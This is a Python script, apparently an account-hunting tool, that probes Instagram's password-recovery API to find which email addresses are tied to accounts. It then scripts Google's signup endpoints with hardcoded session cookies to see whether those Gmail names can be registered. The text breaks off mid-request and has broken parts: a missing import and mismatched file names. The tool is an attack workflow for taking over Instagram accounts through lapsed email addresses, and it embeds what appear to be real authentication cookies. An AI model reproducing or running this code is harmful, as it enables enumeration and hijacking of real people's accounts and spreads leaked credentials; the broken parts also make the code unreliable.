import time
import requests
from colorama import Style
from datetime import datetime
import sys

EXPIRE_TIME = '2026-01-09 01:00:00'
EXPIRE_MSG = '   FILE IS EXPIRE CONTACT @talwnder'

def check_expiration():
    current_time = datetime.now()
    expiration_time = datetime.strptime(EXPIRE_TIME, '%Y-%m-%d %H:%M:%S')
    if current_time > expiration_time:
        print(EXPIRE_MSG)
        sys.exit(1)
check_expiration()
import warnings
import logging
warnings.filterwarnings("ignore", category=UserWarning)
warnings.filterwarnings("ignore", category=RuntimeWarning)
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)
import requests
import json
import random
import re
import time as t
import string
import uuid
from uuid import uuid4
import os as o
import sys as s
from threading import Thread
R = "\x1b[38;5;196m" #lal
P = "\033[35m" #bengni
G = "\033[1;32m" #hra
C = "\033[36m" #fikka nilla
Y = "\033[1;33m" #pila
W = "\033[1;37m" #chita
LG = "\x1b[38;5;120m" #fikka hra
LP = "\x1b[38;5;218m" #fikka pila
LR = "\x1b[38;5;203m" #fikka lal
gi = 0
bi = 0
ge = 0
be = 0
from cfonts import render
print('━' * 73)
logo = render('zorro', font='block', colors=['black', 'red'], align='center', background='black', space=True)
print(logo)
print('━' * 73)
print('            DEVLOPER » @talwnder // CHANNEL » @talwindermm')
print('━' * 73)
print("")
id = input(f"{W}CHAT ID : {W}")
token = input(f"{W}TOKEN : {W}")
o.system('clear')

class InstagramAPI2026:
    def __init__(self):
        self.session = requests.Session()
        self.setup_headers()
    
    def setup_headers(self):
        self.session.headers.update({
            'User-Agent': 'Instagram 329.0.0.0.0 Android (33/13; 480dpi; 1080x2268; samsung; SM-S901E; r9q; qcom; en_US; 525000000)',
            'X-IG-App-ID': '936619743392459',
            'X-IG-Capabilities': '3brTvx0=',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Prefetch-Request': 'foreground',
            'X-Bloks-Version-Id': 'd80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'X-MID': self.generate_mid(),
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
    
    def generate_mid(self):
        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return 'Z' + ''.join(random.choices(chars, k=9)) + 'AA'
    
    def generate_device_id(self):
        return 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    
    def get_csrf_token(self):
        try:
            response = self.session.get(
                'https://www.instagram.com/api/v1/web/accounts/account_recovery/',
                timeout=10
            )
            return response.cookies.get('csrftoken', self.generate_token())
        except:
            return self.generate_token()
    
    def generate_token(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    def check_account_web(self, email):
        try:
            csrf_token = self.get_csrf_token()
            
            payload = {
                'email_or_username': email,
                'recaptcha_challenge_field': '',
                'flow': 'password_reset',
                'app_id': '936619743392459',
                'source': 'account_recovery',
                'next': '',
                '__ajax__': '1',
                'platform': 'web',
                'locale': 'en_US',
                'client_timezone_offset': '-330',
            }
            
            headers = {
                'X-CSRFToken': csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'X-IG-WWW-Claim': '0',
                'X-Instagram-AJAX': '1012876494',
                'X-ASBD-ID': '129477',
                'X-IG-App-Lite': 'false',
                'X-IG-Device-ID': self.generate_device_id(),
                'X-IG-Device-Locale': 'en_US',
                'X-IG-Mapped-Locale': 'en_US',
            }
            
            response = self.session.post(
                'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
                data=payload,
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                if "message" in data and "لم يتم العثور" in data["message"]:
                    return "bad_instagram"
                elif "toast_message" in data and any(x in data["toast_message"] for x in ["أرسلنا رسالة", "We sent an email", "Email sent"]):
                    return "good_instagram"
                elif "status" in data and data["status"] == "ok":
                    return "good_instagram"
            
            return "error"
            
        except Exception as e:
            return "error"
    
    def check_account_mobile(self, email):
        try:
            device_id = self.generate_device_id()
            guid = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            
            headers = {
                'User-Agent': 'Instagram 329.0.0.0.0 Android (33/13; 480dpi; 1080x2268; samsung; SM-S901E; r9q; qcom; en_US; 525000000)',
                'X-IG-App-ID': '936619743392459',
                'X-IG-Capabilities': '3brTvx0=',
                'X-IG-Connection-Type': 'WIFI',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            }
            
            data = {
                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                    '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                    'adid': adid,
                    'guid': guid,
                    'device_id': device_id,
                    'query': email,
                    'login_nonce': '',
                    'client_timezone_offset': '-330',
                    'client_input_params': json.dumps({'email_or_username': email})
                }),
                'ig_sig_key_version': '4',
            }
            
            response = requests.post(
                'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
                headers=headers,
                data=data,
                timeout=15
            )
            
            if response.status_code == 200:
                if email in response.text:
                    return "good_instagram"
                else:
                    return "bad_instagram"
            
            return "error"
            
        except Exception as e:
            return "error"
    
    def check_account(self, email):
        web_result = self.check_account_web(email)
        if web_result != "error":
            return web_result
        
        mobile_result = self.check_account_mobile(email)
        return mobile_result

# Initialize Instagram API
ig_api = InstagramAPI2026()

def zorro():
    try:
        cookies = {
        'OTZ': '8324900_34_34__34_',
        'SID': 'g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWp2VhtJrqULiUWbh4F5p1pQACgYKAZ0SARcSFQHGX2MiosKs80Ki8vVng6fO87i3dRoVAUF8yKq6sW-2iBwaPEmSW4zT7-u90076',
        '__Secure-1PSID': 'g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkbqcgrt80KolBkjK3_1STAACgYKAe8SARcSFQHGX2MihAoJGi5jCxxhdb5W6WopMhoVAUF8yKoub2iEsGYAgoj6r7tp4QkE0076',
        '__Secure-3PSID': 'g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkPywS57gjVE4o6fe6_5irgACgYKAXASARcSFQHGX2Miyj6EHbEItRVIOP76ijMRDxoVAUF8yKo0gJ3sduTvKUY4njSYQdpi0076',
        'HSID': 'Am_2Ay_faDqTECJT8',
        'SSID': 'A5UhpN4T2oDJwIwZI',
        'APISID': 'qx4TV0KnHj0wtO2v/Ah8NAkMC5nV9U1W2t',
        'SAPISID': 'wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm',
        '__Secure-1PAPISID': 'wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm',
        '__Secure-3PAPISID': 'wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm',
        'ACCOUNT_CHOOSER': 'AFx_qI6YdEtZKNaKoAynqsJbeR5qfz7LGLm1z7hHsCkdEzMF2S4dCjnI7i6wbatEZl-4qqncCv1ryBnMUZgHzF8-G-SchyGyDkYsHmfepuBqwUWxO-xOSVlrXU9TTEuAw9VcNKVi-vmf',
        'LSID': 'o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxYM0gDvq4uoHOAgCKmTv7sQACgYKATYSARcSFQHGX2MiL-RByG4wdpXZ-VJELHvNuxoVAUF8yKpsgylirve6kLatoyhVb5UQ0076',
        '__Host-1PLSID': 'o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxG5Peh-xayd65ak4YY3E9ZwACgYKATYSARcSFQHGX2MiSdN6F-d9tjVMjPSuXUIUhhoVAUF8yKoUHTPlSzX_FbmPM-Cct7EI0076',
        'SEARCH_SAMESITE': 'CgQIp58B',
        'AEC': 'AaJma5u8j8R5df3c6vyKDfd0klmSE9L3XomieaLWDsIO1F1gZq_PWfyn7Q',
        '__Host-GAPS': '1:iDYr54pSKmplkNtNHlRbaNh8RFKHK-02v6Fqf3grYdNQQbxtdo7FTmd2DIU1sRBm7Ai_qpVrZ4lkmmeyuitY5NyzLn2C6g:XSQaVwE9s5JL_6d2',
        '__Host-3PLSID': 'o.myaccount.google.com|s.youtube:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxw8D91beunTQR5gr9nVJ6LwACgYKASMSARcSFQHGX2Mif3ocCh0nOVjc9SnmhcRNvBoVAUF8yKpNGj1Uot49dLDWB2-Vt2yl0076',
        'NID': '526=ECseuBdSrxSxMhdByzdopwZjFA6UxWiWx8OV-XPjfu-GoTedCZCZJghHk4_7WfFfv9bFu9E2mwWmip6cK0JRpZnljslZZ4BKDWsZeZHCYX-iln7TkizckksSjof7FURo9bMJbYh81yYETBvH3lwL6epYZoDApbDNdI30c37ZmmUvzVME1xeVkWQyNLCXf2x6ETtN_qPuu7yrU9YORAk1-H0IUlqhlY6xUcovKSEgWnmnJC1YcQcRySp_OmE-j-nbFskW9SpPpesMukU6ZsyoUO51J5FThWavUsgaCo25bzwOpsXe3N7L-GAGCtt8wFdd6dNrolvu15HkHHe00CZjrliKS8vrEoHv',
        'SIDCC': 'AKEyXzWMXmPC-gHsFXYJeSn5hcL4OmZBhi76MC3RdAyTzZ6tYXIpEHmtHiaayc45241FJR5k13g',
        '__Secure-1PSIDCC': 'AKEyXzXiHWsetzQekLSRwJKKAbscyHPsO8pZtVRsBOmM5CXyjqU_X6IVtPhvV_y2MGEiUPbV9Gk',
        '__Secure-3PSIDCC': 'AKEyXzVokGEQ9F9qsuZvaJyeAB2ow4UL_2TICtcnNIf5mYjE2kBppF6FGvEg6qdGFMiejjVfpBU',
        }
        headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; application/x-www-form-urlencoded;charset=UTF-8',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'x-same-domain': '1',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-full-version': '"124.0.6327.4"',
        'sec-ch-ua-platform-version': '"14.0.0"',
        'google-accounts-xsrf': '1',
        'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-model': '"SM-A235F"',
        'sec-ch-ua-wow64': '?0',
        'sec-ch-ua-platform': '"Android"',
        'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
        'origin': 'https://accounts.google.com',
        'x-client-data': 'CNv/ygE=',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://accounts.google.com/signup/v2/createaccount?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&parent_directed=true',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        params = {
        'hl': 'en',
        '_reqid': '36709',
        'rt': 'j',
        }
        data = {
        'continue': 'https://accounts.google.com/ManageAccount?nc=1',
        'flowEntry': 'SignUp',
        'hl': 'en',
        'f.req': '["AEThLlxXXDoHXq65-UCN4i0Brw_NlZltifglDeG5UUWwPGoEw6oGeRCD4KGDMzszWzruVeP_dvdBkwIirgJxGpP3_r9XOgNAnCTpyrhc6bRVMng--mHLIUR9xbZXR5qujWMaYc20srI50YrKxmoELhGxSFky7Ed6W9a8sVOzdf_Gm07ryJAkxUK8mV3jDqd5XuVlXmeZPP1i",null,null,null,null,0,0,"ailenehuca","ailenehuca",null,0,null,1,[],1]',
        'at': 'AFoagUWfqDarcfIG7acytU1IW_xkWwI4RA:1761885660383',
        'azt': 'AFoagUXUC0FpTLP0dJkDmvJzGZtxAL3y1Q:1761885660383',
        'cookiesDisabled': 'false',
        'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
        'gmscoreversion': 'null',
        'flowName': 'GlifWebSignIn',
        'checkConnection': 'youtube:21635',
        'checkedDomains': 'youtube',
        'pstMsg': '1',
        }
        response = requests.post(
        'https://accounts.google.com/_/signup/validatepersonaldetails',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
        )
        cc = response.text
        tl = cc.split('"gf.ttu",null,"')[1].split('"')[0]
    except:
        return
# @aesowns
    try:
        cookies = {
        'OTZ': '8324900_34_34__34_',
        'SID': 'g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWp2VhtJrqULiUWbh4F5p1pQACgYKAZ0SARcSFQHGX2MiosKs80Ki8vVng6fO87i3dRoVAUF8yKq6sW-2iBwaPEmSW4zT7-u90076',
        '__Secure-1PSID': 'g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkbqcgrt80KolBkjK3_1STAACgYKAe8SARcSFQHGX2MihAoJGi5jCxxhdb5W6WopMhoVAUF8yKoub2iEsGYAgoj6r7tp4QkE0076',
        '__Secure-3PSID': 'g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkPywS57gjVE4o6fe6_5irgACgYKAXASARcSFQHGX2Miyj6EHbEItRVIOP76ijMRDxoVAUF8yKo0gJ3sduTvKUY4njSYQdpi0076',
        'HSID': 'Am_2Ay_faDqTECJT8',
        'SSID': 'A5UhpN4T2oDJwIwZI',
        'APISID': 'qx4TV0KnHj0wtO2v/Ah8NAkMC5nV9U1W2t',
        'SAPISID': 'wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm',
        '__Secure-1PAPISID': 'wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm',
        '__Secure-3PAPISID': 'wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm',
        'ACCOUNT_CHOOSER': 'AFx_qI6YdEtZKNaKoAynqsJbeR5qfz7LGLm1z7hHsCkdEzMF2S4dCjnI7i6wbatEZl-4qqncCv1ryBnMUZgHzF8-G-SchyGyDkYsHmfepuBqwUWxO-xOSVlrXU9TTEuAw9VcNKVi-vmf',
        'LSID': 'o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxYM0gDvq4uoHOAgCKmTv7sQACgYKATYSARcSFQHGX2MiL-RByG4wdpXZ-VJELHvNuxoVAUF8yKpsgylirve6kLatoyhVb5UQ0076',
        '__Host-1PLSID': 'o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxG5Peh-xayd65ak4YY3E9ZwACgYKATYSARcSFQHGX2MiSdN6F-d9tjVMjPSuXUIUhhoVAUF8yKoUHTPlSzX_FbmPM-Cct7EI0076',
        'SEARCH_SAMESITE': 'CgQIp58B',
        'AEC': 'AaJma5u8j8R5df3c6vyKDfd0klmSE9L3XomieaLWDsIO1F1gZq_PWfyn7Q',
        '__Host-GAPS': '1:iDYr54pSKmplkNtNHlRbaNh8RFKHK-02v6Fqf3grYdNQQbxtdo7FTmd2DIU1sRBm7Ai_qpVrZ4lkmmeyuitY5NyzLn2C6g:XSQaVwE9s5JL_6d2',
        '__Host-3PLSID': 'o.myaccount.google.com|s.youtube:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxw8D91beunTQR5gr9nVJ6LwACgYKASMSARcSFQHGX2Mif3ocCh0nOVjc9SnmhcRNvBoVAUF8yKpNGj1Uot49dLDWB2-Vt2yl0076',
        'NID': '526=ECseuBdSrxSxMhdByzdopwZjFA6UxWiWx8OV-XPjfu-GoTedCZCZJghHk4_7WfFfv9bFu9E2mwWmip6cK0JRpZnljslZZ4BKDWsZeZHCYX-iln7TkizckksSjof7FURo9bMJbYh81yYETBvH3lwL6epYZoDApbDNdI30c37ZmmUvzVME1xeVkWQyNLCXf2x6ETtN_qPuu7yrU9YORAk1-H0IUlqhlY6xUcovKSEgWnmnJC1YcQcRySp_OmE-j-nbFskW9SpPpesMukU6ZsyoUO51J5FThWavUsgaCo25bzwOpsXe3N7L-GAGCtt8wFdd6dNrolvu15HkHHe00CZjrliKS8vrEoHv',
        'SIDCC': 'AKEyXzWyj-_Ie7IvvDwmBJk5_7L5b2yl3QbtvfRhTE_bIT6TL8OkKIIpIgwGKjBtLOpdwFmpFBE',
        '__Secure-1PSIDCC': 'AKEyXzXiM9XSACb79jnWmdwtJcX5spicIC-TDUCl9yNAbMRkCNVGu-A4L9_2SgDJ_d6Ct4zTArM',
        '__Secure-3PSIDCC': 'AKEyXzUN8p1DKe4FAngyesVCRq1BAHXooNNE8J4hwXx5di-muLNiYfNPekDwPcTPKY_0IKlHaQk',
        } # prime
        headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; application/x-www-form-urlencoded;charset=UTF-8',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'x-same-domain': '1',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-full-version': '"124.0.6327.4"',
        'sec-ch-ua-platform-version': '"14.0.0"',
        'google-accounts-xsrf': '1',
        'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-model': '"SM-A235F"',
        'sec-ch-ua-wow64': '?0',
        'sec-ch-ua-platform': '"Android"',
        'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
        'origin': 'https://accounts.google.com',
        'x-client-data': 'CNv/ygE=',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': f'https://accounts.google.com/signup/v2/birthdaygender?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&parent_directed=true&TL={tl}',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        params = {
        'hl': 'en',
        'TL': tl,
        '_reqid': '536709',
        'rt': 'j',
        }
        data = {
        'continue': 'https://accounts.google.com/ManageAccount?nc=1',
        'flowEntry': 'SignUp',
        'hl': 'en',
        'f.req': f'["TL:{tl}",2015,4,15,2,null,null,0,null,null,0,0]',
        'at': 'AFoagUWfqDarcfIG7acytU1IW_xkWwI4RA:1761885660383',
        'azt': 'AFoagUXUC0FpTLP0dJkDmvJzGZtxAL3y1Q:1761885660383',
        'cookiesDisabled': 'false',
        'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
        'gmscoreversion': 'null',
        'flowName': 'GlifWebSignIn',
        'checkConnection': 'youtube:21635',
        'checkedDomains': 'youtube',
        'pstMsg': '1',
        }
        response = requests.post(
        'https://accounts.google.com/_/signup/validatebasicinfo',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
        )
        ff = response.text
        ttl = json.loads(re.sub(r'^\)\]\}\'\n?', '', ff))[0][0][4].strip().replace('TL:', '', 1)
        with open("zorro.txt", "w") as goat:
            goat.write(ttl) 
    except:
        pass
Thread(target=zorro, daemon=True).start()
def sax():
    o.system('clear')
    s.stdout.write(
    "=========================\n"
        f"{W}GOOD :- {W}{gi}\n"
        f"{W}BAD :- {W}{bi}\n"
        f"{W}EMAIL :- {W}{be}\n"
        f"{W}HITS :- {W}{ge}\n"
        f"{W}Dev:- @talwnder {W}Channel:- @talwindermm\n"
    "========================="
    )
    s.stdout.flush()
def cxqok(x):
    global gi, bi
    headers = {
        'User-Agent': 'Instagram 311.0.0.32.118 Android (25/7.1.2; 450dpi; 2048x2048; Google; Pixel; sailfish; en_US; 545986883)',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Language': 'en-US',
        'X-IG-Android-ID': 'android-5b7ed0786fa2ec6f',
        'X-IG-App-ID': '567067343352427',
        'X-IG-Capabilities': '3brTv10=',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Device-ID': '79147ef2-d663-4f58-9442-5ad27fe4bbb4',
        'X-IG-Timezone-Offset': '19800',
        'X-FB-HTTP-Engine': 'MNS'
    }
    payload = {
        "adid": "ece40bb6-21cf-4071-934d-11ad4cc952ab",
        "guid": "79147ef2-d663-4f58-9442-5ad27fe4bbb4",
        "device_id": "android-5b7ed0786fa2ec6f",        "query": x,
        "waterfall_id": "a0ea3580-7786-49c7-b8fb-daa4513917eb"
    }
    data = {
        'signed_body': f'SIGNATURE.{json.dumps(payload)}'
    }
    response = requests.post(
        'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
        headers=headers,
        data=data
    )
    try:
        j = response.json()
        e = j.get('email', None)
        if e:
            if x == e:
                gi+=1
                sax()
                xoxo(x)
            else:
                bi+=1
                sax()
        else:
            bi+=1
            sax()
    except:
        bi+=1
        sax()
def ninja(y):
    headers = {
        'User-Agent': 'Instagram 311.0.0.32.118 Android (25/7.1.2; 450dpi; 2048x2048; Google; Pixel; sailfish; en_US; 545986883)',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Language': 'en-US',
        'X-IG-Android-ID': 'android-5b7ed0786fa2ec6f',
        'X-IG-App-ID': '567067343352427',
        'X-IG-Capabilities': '3brTv10=',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Device-ID': '79147ef2-d663-4f58-9442-5ad27fe4bbb4',
        'X-IG-Timezone-Offset': '19800',
        'X-FB-HTTP-Engine': 'MNS'
    }
    payload = {
        "adid": "ece40bb6-21cf-4071-934d-11ad4cc952ab",
        "guid": "79147ef2-d663-4f58-9442-5ad27fe4bbb4",
        "device_id": "android-5b7ed0786fa2ec6f",        "query": y,
        "waterfall_id": "a0ea3580-7786-49c7-b8fb-daa4513917eb"
    }
    data = {
        'signed_body': f'SIGNATURE.{json.dumps(payload)}'
    }
    response = requests.post(
        'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
        headers=headers,
        data=data
    )
    try:
    	j = response.json()
    	e = j.get('email', {})
    except:
    	pass
    return e
def xoxo(y):
    global ge, be
    x = y.split("@")[0]
    tl = None
    try:
    	with open("team7x.txt", "r") as goat:
    		tl = goat.read().strip()
    except:
    	zorro()
    cookies = {
    'OTZ': '8324900_34_34__34_',
    'SID': 'g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWp2VhtJrqULiUWbh4F5p1pQACgYKAZ0SARcSFQHGX2MiosKs80Ki8vVng6fO87i3dRoVAUF8yKq6sW-2iBwaPEmSW4zT7-u90076',
    '__Secure-1PSID': 'g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkbqcgrt80KolBkjK3_1STAACgYKAe8SARcSFQHGX2MihAoJGi5jCxxhdb5W6WopMhoVAUF8yKoub2iEsGYAgoj6r7tp4QkE0076',
    '__Secure-3PSID': 'g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkPywS57gjVE4o6fe6_5irgACgYKAXASARcSFQHGX2Miyj6EHbEItRVIOP76ijMRDxoVAUF8yKo0gJ3sduTvKUY4njSYQdpi0076',
    'HSID': 'Am_2Ay_faDqTECJT8',
    'SSID': 'A5UhpN4T2oDJwIwZI',
    'APISID': 'qx4TV0KnHj0wtO2v/Ah8NAkMC5nV9U1W2t',
    'SAPISID': 'wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm',
    '__Secure-1PAPISID': 'wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm',
    '__Secure-3PAPISID': 'wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm',
    'ACCOUNT_CHOOSER': 'AFx_qI6YdEtZKNaKoAynqsJbeR5qfz7LGLm1z7hHsCkdEzMF2S4dCjnI7i6wbatEZl-4qqncCv1ryBnMUZgHzF8-G-SchyGyDkYsHmfepuBqwUWxO-xOSVlrXU9TTEuAw9VcNKVi-vmf',
    'LSID': 'o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxYM0gDvq4uoHOAgCKmTv7sQACgYKATYSARcSFQHGX2MiL-RByG4wdpXZ-VJELHvNuxoVAUF8yKpsgylirve6kLatoyhVb5UQ0076',
    '__Host-1PLSID': 'o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxG5Peh-xayd65ak4YY3E9ZwACgYKATYSARcSFQHGX2MiSdN6F-d9tjVMjPSuXUIUhhoVAUF8yKoUHTPlSzX_FbmPM-Cct7EI0076',
    'SEARCH_SAMESITE': 'CgQIp58B',
    'AEC': 'AaJma5u8j8R5df3c6vyKDfd0klmSE9L3XomieaLWDsIO1F1gZq_PWfyn7Q',
    '__Host-GAPS': '1:iDYr54pSKmplkNtNHlRbaNh8RFKHK-02v6Fqf3grYdNQQbxtdo7FTmd2DIU1sRBm7Ai_qpVrZ4lkmmeyuitY5NyzLn2C6g:XSQaVwE9s5JL_6d2',
    '__Host-3PLSID': 'o.myaccount.google.com|s.youtube:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxw8D91beunTQR5gr9nVJ6LwACgYKASMSARcSFQHGX2Mif3ocCh0nOVjc9SnmhcRNvBoVAUF8yKpNGj1Uot49dLDWB2-Vt2yl0076',
    'NID': '526=ECseuBdSrxSxMhdByzdopwZjFA6UxWiWx8OV-XPjfu-GoTedCZCZJghHk4_7WfFfv9bFu9E2mwWmip6cK0JRpZnljslZZ4BKDWsZeZHCYX-iln7TkizckksSjof7FURo9bMJbYh81yYETBvH3lwL6epYZoDApbDNdI30c37ZmmUvzVME1xeVkWQyNLCXf2x6ETtN_qPuu7yrU9YORAk1-H0IUlqhlY6xUcovKSEgWnmnJC1YcQcRySp_OmE-j-nbFskW9SpPpesMukU6ZsyoUO51J5FThWavUsgaCo25bzwOpsXe3N7L-GAGCtt8wFdd6dNrolvu15HkHHe00CZjrliKS8vrEoHv',
    'SIDCC': 'AKEyXzVbb7ulsncJECLf6UHzpEJLzWH0RaM82KwBzsFJxOZ4sXHU3KOU1ZQ7RggCgLhm39yVDLE',
    '__Secure-1PSIDCC': 'AKEyXzXj44hapWV7B5p25MnnQXq8usDOATpdhLwvryQEFQ-To-wnt8EkyoXbUr1PwNp83G2zbJw',
    '__Secure-3PSIDCC': 'AKEyXzWNxpeA4UNyh41KoWOjqrUAPJdLKdpMbiMbAiQ2MVsdIolmd956OcjloLDOgHvJXyfhDNA',
    }
    headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; application/x-www-form-urlencoded;charset=UTF-8',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'x-same-domain': '1',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-arch': '""',
    'sec-ch-ua-full-version': '"124.0.6327.4"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'google-accounts-xsrf': '1',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-bitness': '""',
    'sec-ch-ua-model': '"SM-A235F"',
    'sec-ch-ua-wow64': '?0',
    'sec-ch-ua-platform': '"Android"',
    'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
    'origin': 'https://accounts.google.com',
    'x-client-data': 'CNv/ygE=',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': f'https://accounts.google.com/signup/v2/createusername?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&parent_directed=true&TL={tl}',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    params = {
    'hl': 'en',
    'TL': tl,
    '_reqid': '636709',
    'rt': 'j',
    }
    data = {
    'continue': 'https://accounts.google.com/ManageAccount?nc=1',
    'flowEntry': 'SignUp',
    'hl': 'en',
    'f.req': f'["TL:{tl}","{x}",0,0,1,null,0,20173]',    'at': 'AFoagUWfqDarcfIG7acytU1IW_xkWwI4RA:1761885660383',
    'azt': 'AFoagUXUC0FpTLP0dJkDmvJzGZtxAL3y1Q:1761885660383',
    'cookiesDisabled': 'false',
    'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
    'gmscoreversion': 'null',
    'flowName': 'GlifWebSignIn',
    'checkConnection': 'youtube:21635',
    'checkedDomains': 'youtube',
    'pstMsg': '1',
    }
    response = requests.post(
    'https://accounts.google.com/_/signup/usernameavailability',
